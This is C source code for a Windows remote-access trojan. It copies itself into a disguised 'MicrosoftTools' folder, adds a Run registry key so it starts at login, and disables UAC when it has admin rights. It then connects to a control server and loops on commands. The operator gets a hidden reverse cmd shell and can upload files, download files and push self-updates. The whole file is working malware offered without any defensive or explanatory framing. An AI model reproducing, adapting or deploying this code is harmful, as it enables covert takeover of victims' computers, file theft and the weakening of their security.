#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "EA_Socket.h"
#include "helper.h"

void infectTheSystemItself(void)
{
	HKEY hKey;
	DWORD dwAttr;
	char command[400 + 1];
	char targetPath[MAX_PATH + 1];
	char srcPathwithName[MAX_PATH + 1];
	char targetPathwithName[MAX_PATH + 1];
	const char progName[] = "deneme.exe";

	GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);

	snprintf(targetPath, MAX_PATH, "%s\\MicrosoftTools", getenv("LOCALAPPDATA"));

	dwAttr = GetFileAttributesA(targetPath);

	if (dwAttr != 0xffffffff && (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
	{
		if (strncmp(srcPathwithName, targetPath, strlen(targetPath)) != 0)
		{
			exit(0);
		}
		return;
	}

	snprintf(targetPathwithName, 400, "%s\\%s", targetPath, progName);

	snprintf(command, 400, "cmd.exe /c mkdir \"%s\"", targetPath);
	WinExec(command, SW_HIDE); Sleep(500);

	snprintf(command, 400, "cmd.exe /c copy \"%s\" \"%s\"", srcPathwithName, targetPathwithName);
	WinExec(command, SW_HIDE); Sleep(500);

	if(ERROR_SUCCESS == RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey))
	{
		RegSetValueExA(hKey, progName, 0, REG_SZ, (BYTE * )targetPathwithName, strlen(targetPathwithName));
	}

	RegCloseKey(hKey);

	// if the program is started without admin, lnRes will not be ERROR_SUCCESS.
	if(ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey))
	{
		dwAttr = 0;
		RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE * )&dwAttr, sizeof(DWORD));
	}

	RegCloseKey(hKey);

	snprintf(command, 400, "cmd.exe /c start %s", targetPathwithName);
	WinExec(command, SW_HIDE); Sleep(500);

	exit(0);
}

void connectToBigBrotherAndBecomeZombie(void)
{
	int sckt;
	char * al;
    int port = 5005;
    struct hostent * he;
	int de, check = 0, yes = 1;
	struct sockaddr_in veriler;
    struct in_addr ** addr_list;
    char host[] = "127.0.0.1";

	while((he = gethostbyname(host)) == NULL)
	{
		Sleep(1000);
	}

	addr_list = (struct in_addr **)he->h_addr_list;

	while (1)
	{
		sckt = socket(AF_INET, SOCK_STREAM, 0);

		if (sckt != SOCKET_ERROR)
		{
			setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));

			veriler.sin_family = AF_INET;
			veriler.sin_port = htons(port);
			veriler.sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0]));
			memset(veriler.sin_zero, 0, 8);

			while (1)
			{
				if((check = connect(sckt, (struct  sockaddr *)&veriler, sizeof(veriler))) != SOCKET_ERROR)
				{
					break;
				}

				Sleep(500);
			}

			while(1)
			{
				if ((al = recverText(sckt)) == NULL)
				{
					break;
				}

				if ((de = mainProcessing(sckt, al)) != 0)
				{
					break;
				}

				free(al);
			}

			closesocket(sckt);
		}

		Sleep(1000);
	}
}

int mainProcessing(int sckt, char * al)
{
	if (strncmp(al, "cmd", 3) == 0)
	{
		connectToCMD(sckt);
	}
	else if (strncmp(al, "getFile ", 8) == 0)
	{
		senderFile(sckt, al + 8);
	}
	else if (strncmp(al, "sendFile ", 9) == 0)
	{
		free(recverFile(sckt));
	}
	else if (strncmp(al, "update ", 7) == 0)
	{
		char command[400 + 1];
		char srcPathwithName[MAX_PATH + 1];

		WinExec("cmd.exe /c del old.exe", SW_HIDE); Sleep(200);
		GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);

		snprintf(command, 400, "cmd.exe /c rename %s old.exe", srcPathwithName);
		WinExec(command, SW_HIDE); Sleep(200);

		free(recverFile(sckt));

		snprintf(command, 400, "cmd.exe /c move %s\\MicrosoftTools\\%s %s", getenv("LOCALAPPDATA"), al + 7, srcPathwithName);
		WinExec(command, SW_HIDE); Sleep(200);

		snprintf(command, 400, "cmd.exe /c start %s", srcPathwithName);
		WinExec(command, SW_HIDE); Sleep(200);

		exit(0);
	}

	return 0;
}

void connectToCMD(int sckt)
{
	char * recv = NULL;
	CHAR chBuf[4500 + 1];
	DWORD dwRead, dwWritten;
	SECURITY_ATTRIBUTES saAttr;
	HANDLE hChildStd_IN_Rd = NULL, hChildStd_IN_Wr = NULL, hChildStd_OUT_Rd = NULL, hChildStd_OUT_Wr = NULL;

	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);

	if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0))
	{
		senderText(sckt, "_Error_");
		return;
	}

	if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0))
	{
		senderText(sckt, "_Error_");
		return;
	}

	BOOL bSuccess = FALSE;
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo;

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdInput = hChildStd_IN_Rd;
	siStartInfo.hStdError = hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = hChildStd_OUT_Wr;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	bSuccess = CreateProcessA(TEXT("C:\\Windows\\System32\\cmd.exe"), NULL,
		NULL, NULL, TRUE,
		CREATE_NO_WINDOW, // CREATE_NO_WINDOW CREATE_NEW_CONSOLE
		NULL, NULL, &siStartInfo, &piProcInfo
	);

	if (!bSuccess)
	{
		senderText(sckt, "_Error_");
		return;
	}
	else
	{
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}

	for(;;)
	{
		Sleep(500); //TODO: pipe tam dolana kadar beklenmeli
		//TODO: pipe buf is bigger than 4101 again read, note: PeekNamedPipe
		bSuccess = ReadFile(hChildStd_OUT_Rd, chBuf, 4500, &dwRead, NULL);

		if(!bSuccess || dwRead == 0)
		{
			senderText(sckt, "_Error_");
			WriteFile(hChildStd_IN_Wr, "exit\n", strlen("exit\n"), &dwWritten, NULL);
			break;
		}

		chBuf[dwRead] = 0;
		senderText(sckt, chBuf);
		recv = recverText(sckt);

		if (recv == NULL)
		{
			senderText(sckt, "_Error_");
			WriteFile(hChildStd_IN_Wr, "exit\n", strlen("exit\n"), &dwWritten, NULL);
			break;
		}

		bSuccess = WriteFile(hChildStd_IN_Wr, recv, strlen(recv), &dwWritten, NULL);

		if (!bSuccess)
		{
			free(recv);
			senderText(sckt, "_Error_");
			break;
		}

		if (strcmp(recv, "exit\n") == 0)
		{
			senderText(sckt, "_Error_");
			break;
		}

		free(recv);
	}

	CloseHandle(hChildStd_IN_Wr);
	CloseHandle(hChildStd_OUT_Rd);
}
